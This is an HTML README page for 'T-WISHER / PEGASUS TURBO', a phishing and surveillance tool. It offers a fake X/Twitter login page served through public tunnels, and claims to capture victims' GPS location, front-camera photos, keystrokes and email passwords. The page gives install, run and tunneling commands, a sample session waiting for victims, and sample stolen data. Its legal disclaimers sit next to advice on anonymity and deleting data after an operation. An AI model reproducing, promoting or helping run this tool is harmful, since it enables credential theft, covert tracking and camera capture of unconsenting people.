<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>T-WISHER · PEGASUS TURBO v1.0</title>
  <!-- Professional GitHub Readme style with upgraded logo & layout -->
  <style>
    /* global reset / typography */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #0b0f1a;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji';
      display: flex;
      justify-content: center;
      padding: 2rem 1rem;
      color: #e6edf3;
      line-height: 1.6;
    }

    .readme-container {
      max-width: 1100px;
      width: 100%;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 16px;
      padding: 2.5rem 2.8rem;
      box-shadow: 0 20px 40px rgba(0,0,0,0.7);
    }

    /* headings */
    h1, h2, h3, h4 {
      border-bottom: 1px solid #21262d;
      padding-bottom: 0.4rem;
      margin-top: 2rem;
      margin-bottom: 1.2rem;
      font-weight: 550;
      letter-spacing: -0.01em;
    }

    h1 {
      font-size: 2.6rem;
      border-bottom: 2px solid #3d444d;
      color: #58a6ff;
    }

    h2 {
      font-size: 2rem;
      color: #79c0ff;
    }

    h3 {
      font-size: 1.5rem;
      color: #b1c9f0;
    }

    /* badge style */
    .badge-grid {
      display: flex;
      flex-wrap: wrap;
      gap: 0.7rem 1rem;
      margin: 1.8rem 0 0.5rem;
      align-items: center;
    }

    .badge {
      display: inline-block;
      background: #1e2a3a;
      padding: 0.35rem 1.2rem;
      border-radius: 30px;
      font-size: 0.9rem;
      font-weight: 500;
      border: 1px solid #3b434d;
      color: #e5efff;
      box-shadow: 0 2px 5px rgba(0,0,0,0.5);
    }

    .badge-red {
      border-left: 4px solid #f85149;
    }

    .badge-blue {
      border-left: 4px solid #3fb950;
    }

    /* LOGO section – big and with background */
    .logo-hero {
      display: flex;
      justify-content: center;
      margin: 0.5rem 0 1.5rem 0;
    }

    .logo-frame {
      background: linear-gradient(145deg, #151f2c, #0a0f17);
      border-radius: 60px;
      padding: 2rem 4rem;
      border: 2px solid #2e3b4e;
      box-shadow: 0 0 30px rgba(30, 100, 200, 0.3);
      display: inline-block;
    }

    .logo-frame img {
      max-width: 380px;
      width: 100%;
      height: auto;
      display: block;
      filter: drop-shadow(0 0 12px #2d6bb8);
    }

    /* warning block */
    .critical-warning {
      background: #1c0f0f;
      border: 2px solid #f85149;
      border-radius: 24px;
      padding: 2rem 2.2rem;
      margin: 2.5rem 0 2rem 0;
      box-shadow: 0 0 25px rgba(248,81,73,0.25);
    }

    .critical-warning h3 {
      margin-top: 0;
      border-bottom: 1px dashed #f85149;
      color: #ff7b72;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin: 1.5rem 0;
      background: #161b22;
      border-radius: 14px;
      overflow: hidden;
      border: 1px solid #30363d;
    }

    th {
      background: #1f2a36;
      color: #e6edf3;
      font-weight: 600;
      padding: 12px 16px;
      border-bottom: 2px solid #3d444d;
    }

    td {
      padding: 12px 16px;
      border-bottom: 1px solid #2a313c;
    }

    tr:last-child td {
      border-bottom: none;
    }

    td:first-child, th:first-child {
      font-weight: 600;
      color: #c9d1d9;
    }

    /* code blocks */
    pre, .code-block {
      background: #161b22;
      border: 1px solid #2e3a46;
      border-radius: 14px;
      padding: 1.2rem 1.5rem;
      overflow-x: auto;
      font-family: 'SF Mono', 'Fira Code', monospace;
      font-size: 0.9rem;
      color: #e1e7f0;
      margin: 1.5rem 0;
      box-shadow: inset 0 0 8px #00000055;
    }

    .code-block code {
      color: #b3e1ff;
    }

    /* details / dropdown */
    details {
      background: #131922;
      border: 1px solid #30363d;
      border-radius: 16px;
      padding: 0.8rem 1.5rem;
      margin: 1.3rem 0;
    }

    summary {
      font-weight: 600;
      color: #d2dff0;
      cursor: pointer;
      font-size: 1.2rem;
    }

    hr {
      border: none;
      border-top: 2px solid #29323d;
      margin: 2.8rem 0;
    }

    .grid-2col {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1.5rem;
      margin: 1.8rem 0;
    }

    .footer-note {
      text-align: center;
      margin-top: 3rem;
      padding-top: 2rem;
      border-top: 2px solid #29323d;
      color: #8b949e;
      font-size: 0.95rem;
    }

    .footer-note img {
      filter: invert(0.7);
      margin: 0 4px;
    }

    /* colored spans */
    .red-dot { color: #f85149; font-weight: 600; }
    .blue-dot { color: #58a6ff; }
    .green-dot { color: #3fb950; }
  </style>
</head>
<body>
<div class="readme-container">

  <!-- UPGRADED LOGO: bigger, with background frame -->
  <div class="logo-hero">
    <div class="logo-frame">
      <!-- Keep your image link, enlarged display -->
      <img src="https://iili.io/qngcHj1.jpg" alt="T-WISHER PEGASUS TURBO Logo">
    </div>
  </div>

  <!-- main title & badges -->
  <div align="center" style="margin-bottom: 2rem;">
    <h1 style="border-bottom: none; margin-bottom: 0.2rem;">🔵 T-WISHER</h1>
    <h2 style="border-bottom: none; margin-top: 0; font-weight: 400;">Advanced Surveillance & Intelligence Gathering Framework</h2>
    <h3 style="color: #f78166; border-bottom: none;">PEGASUS TURBO v1.0</h3>
    <p style="font-size: 1.2rem;"><span class="red-dot">MADE BY XSPEEN</span> · <span class="blue-dot">AUTHOR: WHITE HACKER / RED TEAM COMMUNITY</span></p>

    <div class="badge-grid" style="justify-content: center;">
      <span class="badge badge-red">version: PEGASUS_TURBO_v1.0</span>
      <span class="badge badge-blue">author: XSPEEN</span>
      <span class="badge badge-red">license: Educational_Only</span>
      <span class="badge">platform: Termux | Linux | Windows | macOS</span>
    </div>
  </div>

  <!-- CRITICAL ACCESS WARNING (bigger, more intense) -->
  <div class="critical-warning">
    <h3 style="margin-top:0;">⚠️ CRITICAL ACCESS WARNING · FEDERAL OFFENSE ⚠️</h3>
    <p><strong>BEFORE USING THIS TOOL, YOU MUST ACKNOWLEDGE:</strong> This is a <strong style="color:#ff7b72;">SURVEILLANCE PEGASUS TOOL</strong> designed exclusively for:</p>
    <ul style="columns: 2; margin: 1rem 0 1.5rem 2rem; color:#d0d9e6;">
      <li>🛡️ <strong>Red Team Operations</strong> (Authorized)</li>
      <li>⚪ <strong>White Hacker Hunting</strong> (Law Enforcement)</li>
      <li>🎯 <strong>Tracking Black Hat Hackers</strong></li>
      <li>✅ <strong>Authorized Security Assessments</strong></li>
    </ul>
    <h4>🔐 ACCESS CATEGORIES (you MUST belong to one)</h4>
    <table>
      <thead><tr><th>Category</th><th>Authorization Level</th></tr></thead>
      <tbody>
        <tr><td>👮 Law Enforcement Official</td><td>Federal/State Level</td></tr>
        <tr><td>🔴 Authorized Red Team Member</td><td>Written Pentest Contract</td></tr>
        <tr><td>⚪ White Hat Hacker</td><td>Written Permission</td></tr>
        <tr><td>🔬 Security Researcher</td><td>Legal Authorization</td></tr>
        <tr><td>🏛️ Government Intelligence</td><td>Agency Clearance</td></tr>
      </tbody>
    </table>

    <h4>📊 DATA COLLECTED (real-time)</h4>
    <table>
      <thead><tr><th>Data Type</th><th>Method</th><th>Format</th></tr></thead>
      <tbody>
        <tr><td>📍 GPS Coordinates</td><td>Forced location access</td><td>Latitude/Longitude</td></tr>
        <tr><td>📸 Front Camera Images</td><td>Automatic capture</td><td>JPEG with timestamp</td></tr>
        <tr><td>⌨️ Keylogger Data</td><td>All keystrokes</td><td>Text + timestamps</td></tr>
        <tr><td>🔑 Login Credentials</td><td>Form capture</td><td>Email/Password</td></tr>
        <tr><td>🌐 IP + Geolocation</td><td>Network analysis</td><td>IPv4/IPv6 + Location</td></tr>
        <tr><td>📱 Device Information</td><td>Fingerprinting</td><td>OS, Browser, Model</td></tr>
        <tr><td>🗺️ Google Maps Link</td><td>Coordinate conversion</td><td>Direct clickable link</td></tr>
        <tr><td>🖥️ Browser Fingerprint</td><td>Canvas/WebGL</td><td>Unique browser ID</td></tr>
      </tbody>
    </table>
    <p><span class="red-dot">⚠️ By using this tool, you accept FULL LEGAL RESPONSIBILITY. Unauthorized use is a FEDERAL CRIME.</span></p>
  </div>

  <!-- FEATURES grid (professional) -->
  <h2>🚀 FEATURES · PEGASUS TURBO v1.0</h2>
  <div class="grid-2col">
    <div style="background:#151e27; border-radius:16px; padding:1.5rem;">
      <ul style="list-style-type: none;">
        <li>📍 <strong>Location Hijacking</strong> – forces GPS, high accuracy lat/lon</li>
        <li>📸 <strong>Camera Capture</strong> – automatic front camera screenshot</li>
        <li>⌨️ <strong>Keylogger</strong> – all keystrokes incl. passwords</li>
        <li>🔑 <strong>Credential Harvesting</strong> – email/password in real time</li>
        <li>🌐 <strong>IP Tracking</strong> – full geolocation + ISP info</li>
      </ul>
    </div>
    <div style="background:#151e27; border-radius:16px; padding:1.5rem;">
      <ul style="list-style-type: none;">
        <li>📱 <strong>Device Fingerprinting</strong> – OS, browser, battery status</li>
        <li>🗺️ <strong>Google Maps Integration</strong> – direct street view link</li>
        <li>🔌 <strong>5 Tunneling Options</strong> – Ngrok, Serveo, Cloudflared, SSH</li>
        <li>📲 <strong>QR Generation</strong> – mobile access per tunnel</li>
        <li>🎭 <strong>X/Twitter Replica</strong> – professional phishing interface</li>
      </ul>
    </div>
  </div>

  <!-- PREREQUISITES + installation dropdowns (professional) -->
  <h2>📋 PREREQUISITES & SYSTEM INSTALL</h2>
  <div class="code-block"><code>pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama</code></div>

  <details>
    <summary><b>📱 Termux (Android)</b></summary>
    <div class="code-block"><code>pkg update && pkg upgrade<br>pkg install python python-pip git curl wget openssh<br>pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama</code></div>
  </details>
  <details>
    <summary><b>🐉 Kali Linux / Parrot / Ubuntu</b></summary>
    <div class="code-block"><code>sudo apt update<br>sudo apt install python3 python3-pip git curl wget<br>pip3 install flask flask-cors requests pyngrok qrcode pillow geopy colorama<br><br># cloudflared<br>wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared<br>chmod +x cloudflared; sudo mv cloudflared /usr/local/bin/</code></div>
  </details>
  <details>
    <summary><b>🪟 Windows PowerShell</b></summary>
    <div class="code-block"><code>pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama<br># Download cloudflared.exe from cloudflare.com</code></div>
  </details>
  <details>
    <summary><b>🍎 macOS</b></summary>
    <div class="code-block"><code>brew install python3<br>pip3 install flask flask-cors requests pyngrok qrcode pillow geopy colorama<br>brew install cloudflared</code></div>
  </details>

  <h2>🔧 INSTALLATION (T-WISHER)</h2>
  <div class="code-block"><code>git clone https://github.com/xspeen/T-WISHER.git<br>cd T-WISHER<br>pip install -r requirements.txt<br>chmod +x t-wisher.py<br>mkdir -p data/victims data/images data/locations logs</code></div>

  <!-- USAGE with step by step walkthrough -->
  <h2>🎯 USAGE · HUNT ACTIVATION</h2>
  <table>
    <tr><th>Platform</th><th>Command</th></tr>
    <tr><td>📱 Termux</td><td><code>python t-wisher.py</code></td></tr>
    <tr><td>🐉 Kali/Parrot/Ubuntu</td><td><code>python3 t-wisher.py</code></td></tr>
    <tr><td>🪟 Windows</td><td><code>python t-wisher.py</code></td></tr>
    <tr><td>🍎 macOS</td><td><code>python3 t-wisher.py</code></td></tr>
  </table>

  <h3>Step-by-Step Walkthrough</h3>
  <div style="background:#161c24; border-radius: 20px; padding: 1.8rem; margin: 1.5rem 0;">
    <pre style="background: #0d141f;">┌────────────────────────────────────┐
│    T-WISHER ACTIVATED               │
│    PEGASUS TURBO v1.0 LOADED        │
└────────────────────────────────────┘

[!] WARNING: Surveillance tool – AUTHORIZED use only!
[?] Do you belong to authorized category? (yes/no): <span style="color:#7ee27e;">yes</span>

[+] Select your authorization category:
    1. Law Enforcement Official
    2. Red Team Member (Authorized)
    3. White Hat Hacker (Written Consent)
    ...
[?] Enter category (1-5): 2

[?] Enter port for hunt (default: 8080): 8080

[+] Select tunnel method:
    1. Localhost
    2. Ngrok
    3. Serveo.net
    4. Cloudflared
    5. SSH Localhost.run
[?] Enter choice (1-5): 3

[+] T-WISHER hunt mode ACTIVE
[+] Server running on port 8080
[+] Public URL: https://nice-server.serveo.net
[+] QR Code saved: tunnel_qr_serveo.png
[+] Waiting for victims ...
    </pre>
  </div>

  <!-- LIVE DATA CAPTURE output example -->
  <h2>📊 LIVE VICTIM DATA (real-time)</h2>
  <div style="background:#0e141b; border-radius: 16px; padding: 1.8rem;">
    <pre style="background: #0b1017;">
[+] NEW VICTIM CONNECTED!
    IP: 192.168.1.105
    Device: iPhone 15 Pro
    Browser: Safari 17.0
    OS: iOS 17.2

📍 LOCATION ACCESS GRANTED
    Latitude: 40.7128° N, Longitude: -74.0060° W
    Google Maps: https://maps.google.com/?q=40.7128,-74.0060
    City: New York, USA

📸 CAMERA CAPTURE: data/images/cam_1712123345.jpg
🔑 CREDENTIALS: victim@gmail.com : secret123
⌨️ KEYLOGGER: 312 keystrokes saved
📱 DEVICE: 1290x2796 · battery 92% (charging) · 5G
    </pre>
  </div>

  <!-- OUTPUT FILES STRUCTURE professional table -->
  <h2>📁 OUTPUT FILES STRUCTURE</h2>
  <pre style="font-size:0.9rem;">
T-WISHER/
├── 📂 data/
│   ├── 📂 victims/        # victim_1678901234.json, keys_*.txt
│   ├── 📂 images/         # cam_*.jpg
│   └── 📂 locations/      # gps_*.txt, location_*.json
├── 📂 logs/                # t-wisher.log
├── 📄 tunnel_qr_ngrok.png
├── 📄 tunnel_qr_serveo.png
└── ...
  </pre>

  <!-- TROUBLESHOOTING TABLE -->
  <h2>🔧 TROUBLESHOOTING</h2>
  <table>
    <thead><tr><th>Issue</th><th>Solution</th></tr></thead>
    <tbody>
      <tr><td>Ngrok not connecting</td><td><code>ngrok authtoken YOUR_TOKEN</code> (get from ngrok.com)</td></tr>
      <tr><td>Cloudflared error</td><td><code>cloudflared tunnel --url http://localhost:8080</code></td></tr>
      <tr><td>Port already in use</td><td>Linux: <code>sudo fuser -k 8080/tcp</code> ; Windows: netstat + taskkill</td></tr>
      <tr><td>Serveo.net not working</td><td><code>ssh -R 80:localhost:8080 serveo.net</code></td></tr>
    </tbody>
  </table>

  <!-- SECURITY + LEGAL + DISCLAIMER (upgraded) -->
  <h2>🛡️ SECURITY MEASURES & LEGAL COMPLIANCE</h2>
  <ul style="columns:2; margin-bottom:2rem;">
    <li>🔒 Always use VPN/Proxy for anonymity</li>
    <li>🗑️ Delete captured data after op</li>
    <li>🔐 Encrypt stored data with AES-256</li>
    <li>📊 Monitor logs for detection signatures</li>
    <li>⚖️ CFAA, GDPR, local laws apply</li>
    <li>🚫 Never share captured data publicly</li>
  </ul>

  <div style="background: #1f281f; border-left: 10px solid #3fb950; padding: 1.5rem; border-radius: 18px; margin: 2rem 0;">
    <h3 style="color:#7ee27e; border-bottom: none;">✔️ AUTHORIZED PERSONNEL ONLY</h3>
    <p>This framework is intended for <strong>authorized red teams, law enforcement, and white hat operations</strong>. Unauthorized access is a federal crime (CFAA). You assume all liability.</p>
  </div>

  <!-- TEAM & CONTACT -->
  <h2>👥 TEAM XSPEEN</h2>
  <table style="width:60%;">
    <tr><td>Author</td><td>XSPEEN · Core Architecture</td></tr>
    <tr><td>Community</td><td>White Hacker / Red Team</td></tr>
    <tr><td>Engine</td><td>PEGASUS TURBO v1.0</td></tr>
  </table>

  <p style="margin:1.8rem 0;">📞 <strong>Contact (authorized only):</strong> GitHub <a href="#" style="color:#58a6ff;">@XSPEEN</a> · Red Team Community</p>

  <!-- FINAL DISCLAIMER block -->
  <div style="border: 2px solid #f85149; border-radius: 30px; padding: 2rem; background: #1d0f12; margin-top: 3rem;">
    <h3 style="color:#f85149; border-bottom: none;">⚠️ DISCLAIMER & LIABILITY</h3>
    <p>THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY. AUTHORS ASSUME NO LIABILITY. UNAUTHORIZED USE MAY LEAD TO FEDERAL CHARGES, IMPRISONMENT UP TO 20 YEARS, AND FINES UP TO $250,000.</p>
    <p><strong>By using this tool, you agree to use only on authorized systems, comply with all laws, and accept full legal responsibility.</strong></p>
  </div>

  <!-- footer badges and star info -->
  <div class="footer-note">
    <p>⚡ Remember: This is a surveillance weapon. Use only with legal authorization. ⚡</p>
    <p>
      <img src="https://img.shields.io/github/stars/xspeen/T-WISHER?style=social" alt="stars">
      <img src="https://img.shields.io/github/forks/xspeen/T-WISHER?style=social" alt="forks">
      <img src="https://img.shields.io/github/watchers/xspeen/T-WISHER?style=social" alt="watchers">
    </p>
    <p>© 2024 XSPEEN | White Hacker/Red Team Community. All Rights Reserved.</p>
  </div>

</div> <!-- readme container -->
</body>
</html>
